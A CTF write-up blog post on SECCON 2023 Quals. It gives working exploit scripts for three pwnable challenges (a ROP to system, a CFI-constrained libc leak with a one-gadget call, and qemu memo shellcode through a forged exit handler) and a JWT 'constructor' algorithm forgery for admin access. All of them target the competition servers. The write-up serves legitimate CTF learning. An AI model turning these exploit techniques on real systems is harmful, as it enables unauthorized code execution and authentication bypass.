---
toc: true
title: SECCON 2023 Quals
description: 'Did not have much time to go hard on this one, but I do solve a few challenges'
date: 2023-09-16
author: Duc Anh Nguyen
---
*Did not have time to go in hard with this CTF, but I did try to touch on the **pwnable** challenges as much as possible.* \
=====<ins>[**Challenge Sources**](https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON)</ins>=====

## **Pwnable**
*Notes*: This is how pwnable challenges should be made, just give the source code instead of making everyone turn on Ghidra.

### 1. ROP-2.35
---
<ins>[**Source**](https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON/rop-2.35/published)</ins> \
For beginner this challenge has some annoying steps that will make you mentally ill. The gist of this one is to overwrite system argument.
```c
// main.c
#include <stdio.h>
#include <stdlib.h>

void main() {
  char buf[0x10];
  system("echo Enter something:");
  gets(buf);
}
```

```asm
// GDB output:
0x0000000000401156 <+0>:     endbr64
0x000000000040115a <+4>:     push   rbp
0x000000000040115b <+5>:     mov    rbp,rsp
0x000000000040115e <+8>:     sub    rsp,0x10
0x0000000000401162 <+12>:    lea    rax,[rip+0xe9b]        # 0x402004
0x0000000000401169 <+19>:    mov    rdi,rax
0x000000000040116c <+22>:    call   0x401050 <system@plt>
0x0000000000401171 <+27>:    lea    rax,[rbp-0x10]
0x0000000000401175 <+31>:    mov    rdi,rax
0x0000000000401178 <+34>:    mov    eax,0x0
0x000000000040117d <+39>:    call   0x401060 <gets@plt>
0x0000000000401182 <+44>:    nop
0x0000000000401183 <+45>:    leave
0x0000000000401184 <+46>:    ret
```


Set a breakpoint at `*main+39`. When we continue, it will not hit a breakpoint but output this.
```
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7dc4740 (LWP 80425) vfork to child process 80428]
[New inferior 2 (process 80428)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 80425 after child exec]
[Inferior 1 (process 80425) detached]
process 80428 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "main" in current contex
```

That is because the system call is actually creating child process and for some reasons my gdb chooses to follow the child and abandon the parent ***(bruh)*** as default. Stop this dodgy behavior through `set follow-fork-mode parent`.

We can overflow the buffer to overwrite the address when main returns with gets. Do your cyclic stuff to find the offset (search if you don't know what this is).
The question now is to return where. There is no `put@plt` in this binary so leaking libc base address is out of the question. NX is enabled and the buffer length is 16 bytes so I ain't doing shellcode. Notice that when main returns, rax contains the address of the buffer.

`*RAX  0x7fffffffddd0 ◂— 'somerandomvalue'`

And `gets` write our payload into the buffer at rax. There is a `mov rdi, rax` just before system is called. So we will be returning there after overflowing. Now `rdi` contains the value of our payload and system will use the value in `rdi` register as its argument. We can now execute `system(payload)`! Or can we?

When you debug this, after sending the payload, it can be seen that system is loading our payload as its arguments. It actually works in my Kali environment but it gives me this when exploiting remotely:

**`sh: 1: V\x11@ not found`**

Well this challenge's binary is built with libc-2.35 (hint: in title). So use [pwninit](https://github.com/io12/pwninit) to patch the binary with the libc-2.35 extracted from Ubuntu 22.04 docker (it is provided in the Dockerfile). It behaves exactly the same as the remote binary. Debugging the binary, it turns out that even though GDB shows that system is loading our command, it is pushing a bunch registers which leads to junk in the system argument. We can get rid of them gradually with `ret` gadget so that system loads our `/bin/sh\0` payload and we are done.

```python
# solve.py
from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.arch = 'amd64'
pty = process.PTY
is_local = False

elf = ELF("/home/kali/CTF/SECCON/rop-2.35/chall_patched")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    #  nc rop-2-35.seccon.games 9999
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug(cmd='''
        set follow-fork-mode parent
        b *main + 46
      ''')

offset = 24
system_address = elf.symbols["system"]

log.info("System plt: " + hex(system_address))
print(p.recvuntilS("Enter something:\n"))


payload = b"/bin/sh\0\0" + b"/bin/p" + b"/bin/pwd\0"
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401169)
p.sendline(payload)
p.sendline("cat /flag*")
p.interactive()
```
`Flag: SECCON{i_miss_you_libc_csu_init_:cry:}`
### 2. selfcet
---
<ins>[**Source**](https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON/selfcet/selfcet)</ins>


We have BOF in a struct that contains a function pointer and arguments for the function. The function pointer and the second argument can be fully controlled, and the first 4 bytes of the first argument can be controlled. However, we can only jump to the start of a valid function due to the ENDBR check before the indirect call.

At the first stage of the exploit, we have to leak the libc address by overwriting the first argument to read@got and partially overwriting the fptr to change err@libc to warn@libc. (1/16 probability) And then, we can call signal(SIGABRT, entrypoint) and trigger the abort signal by overwriting the stack cookie to enable the repetition of the exploit.

Due to the function argument constraints, dprintf(fd, fmt, ...) should be used for the arbitrary read. Since we don't have an address of input data, we have to leak a stack address by calling dprintf with the format string "%s(%s%c%#tx) [%p]" in libc and then leak the stack cookie.

Finally, we can overwrite the return address to one gadget to get a shell.

```c
// main.c
#define INSN_ENDBR64 (0xF30F1EFA) /* endbr64 */
#define CFI(f)                                              \
  ({                                                        \
    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
      __builtin_trap();                                     \
    (f);                                                    \
  })

...

void read_member(ctx_t *ctx, off_t offset, size_t size) {
  if (read(STDIN_FILENO, (void*)ctx + offset, size) <= 0) {
    ctx->status = EXIT_FAILURE;
    ctx->error = "I/O Error";
  }
  ctx->buf[strcspn(ctx->buf, "\n")] = '\0';

  if (ctx->status != 0)
    CFI(ctx->throw)(ctx->status, ctx->error);
}

...

  read_member(&ctx, offsetof(ctx_t, key), sizeof(ctx));
  read_member(&ctx, offsetof(ctx_t, buf), sizeof(ctx));

```


```python
# solve.py
import os

os.environ["PWNLIB_NOTERM"] = "1"
from pwn import *

context.arch = 'amd64'
context.bits = 64

while True:
    r = remote("selfcet.seccon.games", 9999)

    try:
        r.send(flat({
            0x48: 0x403FE8,  # read@got
            0x50: b"\x10\x20",
        }))
        r.recvuntil(b"xor: ")
        leak = r.recvuntil(b": Success")[:-9]
        libc = ELF("selfcet.libc")
        libc.address = u64(leak.ljust(8, b"\x00")) - libc.symbols["read"]
        print("libc.address", hex(libc.address))

        r.send(flat({
            0x48 - 32: p32(6),
            0x40 - 32: 0x401020,  # _start
            0x50 - 32: libc.symbols["signal"],
        }).ljust(0x58, b"\x00"))

        #

        r.recvuntil(b"terminated\n")
        r.send(flat({
            0x48: p32(1),
            0x40: next(libc.search(b"%s(%s%c%#tx) [%p]")),
            0x50: libc.symbols["dprintf"],
        }).ljust(0x58, b"\x00"))
        r.recvuntil(b"0x7")
        stack_leak = int(b"0x7" + r.recvuntil(b")")[:-1], 16)
        r.recvuntil(b"]")
        print("stack_leak", hex(stack_leak))

        r.send(flat({
            0x48 - 32: p32(1),
            0x40 - 32: stack_leak + 0x290 + 1,
            0x50 - 32: libc.symbols["dprintf"],
        }).ljust(0x58, b"\x00"))
        stack_cookie = b"\x00" + r.recvn(7)
        print("stack_cookie", stack_cookie)

        r.recvuntil(b"terminated\n")

        r.send(b"\x00" * 32)
        time.sleep(0.5)

        payload = b""
        payload += b"\x00" * (88 - 0x20)
        payload += stack_cookie
        payload += p64(0x404800)
        payload += p64(libc.address + 0xebcf8)
        r.send(payload)

        r.interactive()
    except EOFError:
        continue
    finally:
        r.close()
```

### 3. umemo
---
```python
# solve.py
#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

def check_byte(b):
    # bytes eaten by qemu tty weirdness
    assert b not in [3, 4, 10, 17, 19, 21, 26, 28, 127], b

def check_bytes(bs):
    for b in bs:
        check_byte(b)

SHELLCODE = asm(shellcraft.sh())
check_bytes(SHELLCODE)

r = remote('ukqmemo.seccon.games', 6318)
_, param, token = r.recvline().decode().strip().split()
assert param == '-mb26', param
result = subprocess.check_output(['hashcash', '-q', '-mb26', token])
r.sendline(result.strip())

r.recvuntil(b'login: ')
r.sendline(b'ctf')
r.recvuntil(b'> ')

def read_fixed(index):
    r.sendline(b'1') # fixed

    r.recvuntil(b'> ')
    r.sendline(b'1')  # read

    r.recvuntil(b'Index: ')
    r.sendline(str(index).encode())

    r.recvuntil(b'Output: ')
    data = r.recvn(0x100)
    r.recvuntil(b'> ')

    r.sendline(b'0')
    r.recvuntil(b'> ')

    return data

def write_fixed(index, data, read_prompt=True):
    check_bytes(data)

    r.sendline(b'1') # fixed

    r.recvuntil(b'> ')
    r.sendline(b'2')  # write

    r.recvuntil(b'Index: ')
    r.sendline(str(index).encode())

    r.recvuntil(b'Input: ')
    if not read_prompt:

        pause()

    r.send(data)
    if len(data) < 0x100:
        r.send(b'\n')

    if read_prompt:
        r.sendline(b'0')
        r.recvuntil(b'> ')

def read_free(offset, size):
    r.sendline(b'2') # free

    r.recvuntil(b'> ')
    r.sendline(b'1')  # read

    r.recvuntil(b'Offset: ')
    r.sendline(str(offset).encode())

    r.recvuntil(b'Size: ')
    r.sendline(str(size).encode())

    r.recvuntil(b'Output: ')
    data = r.recvn(size)
    r.recvuntil(b'> ')

    r.sendline(b'0')
    r.recvuntil(b'> ')

    return data

def write_free(offset, data):
    check_bytes(data)

    r.sendline(b'2') # free

    r.recvuntil(b'> ')
    r.sendline(b'2')  # write

    r.recvuntil(b'Offset: ')
    r.sendline(str(offset).encode())

    r.recvuntil(b'Size: ')
    r.sendline(str(len(data)).encode())

    r.recvuntil(b'Input: ')
    r.send(data)

    r.sendline(b'0')
    r.recvuntil(b'\n> ')

offset = (1 << 30) - 0x1000 - 1
data = read_free(offset, 1024)[1:]
buf_addr = u(data[:8])
mmap_addr = buf_addr - 0x100
print('mmap_addr =', hex(mmap_addr))

ld_base = mmap_addr + 0x191000
print('ld_base =', hex(ld_base))

libc_base = mmap_addr + 0x3000
print('libc_base =', hex(libc_base))

libc_stack_end_addr = ld_base + 0x2ba10
exit_handlers = libc_base + 0x17D660
fs_base = ld_base - 0x980

existing = p(buf_addr)
def set_addr(addr):
    global existing
    to_write = p(addr)
    for i in range(8):
        if to_write[i:] == existing[i:]:
            to_write = to_write[:i]
            break;
    for o, b in list(enumerate(to_write))[::-1]:
        check_byte(b)
        data = b'A' * (o + 1)
        data += bytearray([b])
        write_free(offset, data)
    existing = p(addr)

    wrote = u(read_free(offset, 9)[1:])
    assert wrote == addr, hex(wrote) + ' vs ' + hex(addr)

set_addr(libc_stack_end_addr)
libc_stack_end = u(read_fixed(0)[:8])
print('libc_stack_end =', hex(libc_stack_end))

set_addr(libc_stack_end - 0x18)
start_ret_addr = u(read_fixed(0)[:8])
binary_base = start_ret_addr - 0x1265
print('binary_base =', hex(binary_base))

shellcode_addr = libc_stack_end + 0x100
print('shellcode_addr =', hex(shellcode_addr))
set_addr(shellcode_addr)
write_fixed(0, SHELLCODE)

set_addr(fs_base)
tls = read_fixed(0)
stack_canary = u(tls[0x28:0x30])
pointer_guard = u(tls[0x30:0x38])
print('stack_canary = ', hex(stack_canary))
print('pointer_guard = ', hex(pointer_guard))

def rol64(value, n):
    MASK = (1 << 64) - 1
    return ((value << n) | (value >> (64 - n))) & MASK

def mangle(ptr):
    return rol64(ptr ^ pointer_guard, 17)

bss_addr = binary_base + 0x4800

set_addr(exit_handlers)
write_fixed(0, p(bss_addr))

set_addr(bss_addr)
fake_exit_function_list = b''
fake_exit_function_list += b'A' * 8 # next
fake_exit_function_list += p(1) # idx
fake_exit_function_list += p(2) # flavor
fake_exit_function_list += p(mangle(shellcode_addr)) # fn
fake_exit_function_list += b'B' * 8 # arg
write_fixed(0, fake_exit_function_list)

r.sendline(b'0')

context.log_level = 'debug'
r.interactive(prompt='')
```

## **Web**
### 1.Bad JWT
---
```
# Bad JWT

## Overview

Manipulate the header of JWT with the desired algorithm.

```javascript
const algorithms = {
	hs256: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
	hs512: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}

...

const createSignature = (header, payload, secret) => {
	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
	const signature = algorithms[header.alg.toLowerCase()](data, secret);
	return signature;
}
```

```sh
> const algorithms = {
... 	hs256: (data, secret) => 
... 		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
... 	hs512: (data, secret) => 
... 		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
... }

> algorithms['constructor']
[Function: Object]

> algorithms['constructor']("data")
[String: 'data']
```


```py
solve.py
import requests
import base64

header = b'{"typ":"JWT","alg":"constructor"}'
payload = b'{"isAdmin":true}'

enc_header = base64.b64encode(header).replace(b'=', b'').decode()
enc_payload = base64.b64encode(payload).replace(b'=', b'').decode()
sig = base64.b64encode(header+payload).replace(b'=', b'').decode()

cookies = {
    'session': f'{enc_header}.{enc_payload}.{sig}'
}
print(cookies)

response = requests.get('http://bad-jwt.seccon.games:3000/', cookies=cookies, verify=False)
#response = requests.get('http://localhost:3000/', cookies=cookies, headers=headers, verify=False)

print(response.text)
```

`SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}`